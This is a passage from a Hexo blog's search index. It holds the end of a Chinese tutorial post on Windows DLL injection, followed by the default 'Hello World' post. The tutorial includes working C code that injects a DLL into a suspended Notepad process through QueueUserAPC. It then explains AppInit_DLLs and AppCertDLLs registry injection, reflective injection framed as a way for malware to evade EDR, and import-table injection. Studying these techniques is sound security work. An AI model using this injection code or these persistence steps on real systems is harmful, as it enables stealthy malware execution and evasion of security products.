class="hljs-literal">FALSE</span>;<br>&#125;<br>DWORD dwRet = <span class="hljs-number">0</span>;<br>HANDLE hThread = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (Thread32First(hSnap, &amp;te)) &#123;<br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (te.th32OwnerProcessID == dwPid) &#123;<br>hThread = OpenThread(THREAD_ALL_ACCESS, <span class="hljs-literal">FALSE</span>, te.th32ThreadID);<br><span class="hljs-keyword">if</span> (hThread) &#123;<br><span class="hljs-comment">//往APC队列中插入Load；ibary函数 参数为PDDLadd</span><br>dwRet = QueueUserAPC((PAPCFUNC)pFuncAddr, hThread, (ULONG_PTR)PDDLaddr);<br>hThread = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (Thread32Next(hSnap, &amp;te));<br>&#125;<br><br>CloseHandle(hThread);<br>CloseHandle(hProcess);<br>CloseHandle(hSnap);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br><br>&#125;<br><span class="hljs-type">int</span> main()<br>&#123;<br>STARTUPINFO si = &#123; <span class="hljs-number">0</span> &#125;;<br>PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br>si.cb = <span class="hljs-keyword">sizeof</span>(STARTUPINFO);<br><br><span class="hljs-type">int</span> pid = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (CreateProcessA(<span class="hljs-string">&quot;C:\\Program Files\\WindowsApps\\Microsoft.WindowsNotepad_11.2507.26.0_x64__8wekyb3d8bbwe\\Notepad\\Notepad.exe&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">TRUE</span>, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPSTARTUPINFOA)&amp;si, &amp;pi) == <span class="hljs-literal">FALSE</span>) &#123;<br>        printf(<span class="hljs-string">&quot;创建进程失败&quot;</span>);<br><br>&#125;<br>    pid = GetProcessPID(<span class="hljs-string">&quot;Notepad.exe&quot;</span>);<br><span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>printf(<span class="hljs-string">&quot;未找到进程&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">char</span>* dll_path = <span class="hljs-string">&quot;F:\\c\\yawatadll\\x64\\Release\\yawatadll.dll&quot;</span>;<br><br><br><span class="hljs-keyword">if</span> (ApcInjectDll(pid, dll_path)) &#123;<br>ResumeThread(pi.hThread);<br>printf(<span class="hljs-string">&quot;注入成功&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20251003170846661.png" alt="image-20251003170846661"></p><h1 id="AppInit-DLLs注入"><a href="#AppInit-DLLs注入" class="headerlink" title="AppInit_DLLs注入"></a>AppInit_DLLs注入</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>这是 Windows 系统为方便进行系统层扩展而提供的机制。加载 user32.dll（几乎所有图形用户界面（GUI）应用都会加载该文件）的应用程序，都会读取由该机制在注册表中指定的动态链接库（DLL）。不过，从 Windows 7 系统开始，需要手动将注册表中的 “LoadAppInit_DLLs” 项设置为 “1”（该值默认为 “0”），并且还需通过设置 “RequireSignedAppInit_DLLs&#x3D;1” 来强制验证相关 DLL 的数字签名。</p><h2 id="流程："><a href="#流程：" class="headerlink" title="流程："></a>流程：</h2><p>修改注册表项 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs，写入 DLL 的路径。</p><p>设置 LoadAppInit_DLLs＝1（必要时将 RequireSignedAppInit_DLLs 设为 0）。</p><p>每当程序加载 user32.dll 时，Windows 加载器会自动调用 LoadLibrary 来加载该列表中的 DLL。</p><p>优点是一次设置就能实现全系统注入，且重启后仍持续有效；缺点是特征非常明显，也最容易被发现。</p><h1 id="AppCertDLLs注入"><a href="#AppCertDLLs注入" class="headerlink" title="AppCertDLLs注入"></a>AppCertDLLs注入</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>这一机制和上面的 AppInit_DLLs 很相似，它处于会话管理器（Session Manager）阶段，任何调用 CreateProcess、WinExec 函数的程序都会先加载该机制在注册表中指定的 DLL。</p><p>它比 AppInit_DLLs 更精准，仅针对需要生成子进程的程序流程，常见于防毒软件的动态拦截或家长监控软件中。其缺点与 AppInit_DLLs 类似：需要写入系统注册表，且在现代 Windows 系统中会受到签名限制；此外，仅具备图形界面（GUI-only）的应用程序如果内部不调用 CreateProcess 函数，就不会触发该机制。</p><h1 id="反射dll注入"><a href="#反射dll注入" class="headerlink" title="反射dll注入"></a>反射dll注入</h1><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>dll注入技术是让某个进程主动加载指定的dll的技术。恶意软件为了提高隐蔽性，通常会使用dll注入技术将自身的恶意代码以dll的形式注入高可信进程。</p><p>常规的dll注入技术使用LoadLibraryA()函数来使被注入进程加载指定的dll。常规dll注入的方式一个致命的缺陷是需要恶意的dll以文件的形式存储在受害者主机上。这样使得常规dll注入技术在受害者主机上留下痕迹较大，很容易被edr等安全产品检测到。为了弥补这个缺陷，stephen fewer提出了反射式dll注入技术并在<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">github开源</a>，反射式dll注入技术的优势在于可以使得恶意的dll通过socket等方式直接传输到目标进程内存并加载，期间无任何文件落地，安全产品的检测难度大大增加。</p><h2 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h2><p>这里的具体讲述我就给到先知社区的这个大佬的文章了，因为太过于完美了，我不知道写什么。在他这篇文章面前，我再怎么诉说反射dll注入，都不如大家看他的一眼。</p><p><a href="https://xz.aliyun.com/news/17089">自举的代码幽灵——反射DLL注入（Reflective DLL Injection）-先知社区</a></p><h1 id="PE注入"><a href="#PE注入" class="headerlink" title="PE注入"></a>PE注入</h1><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>当程序被加载时，系统会根据程序导入表信息来加载需要用到的dll,导入表注入的原理就是修改程序的导入表，将自己的dll添加到程序的导入表中，这样程序运行时可以将自己的DLL加载到程序的进程空间.</p><p>具体的可以看下面两个大佬的文章，因为涉及到PE结构，那么过程就会很复杂，一时半会也写不完，后面有时间再填这个坑吧</p><p>[<a href="https://bbs.kanxue.com/thread-262420.htm">原创]PE基础之导入表注入-软件逆向-看雪论坛-安全社区|非营利性质技术交流社区</a></p><p><a href="https://zhuanlan.zhihu.com/p/6905132975">https://zhuanlan.zhihu.com/p/6905132975</a></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>除了本章深入探讨的 DLL 注入技术，还有诸多其他注入技艺。考虑到内容的合理编排，我已将这些独立且内容丰富的技术，如 DLL Hollowing、进程镂空以及特洛伊 DLL 注入（即 DLL 劫持）等，分散到后续专题中进行详细阐述。敬请期待，我将逐一深入剖析这些注入技艺的奥秘。</p><p>若有疏漏或不足之处，还请各位不吝赐教。</p><p>我是 yawataa，我们下一篇再见！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/03/07/hello-world/"/>
    <url>/2025/03/07/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
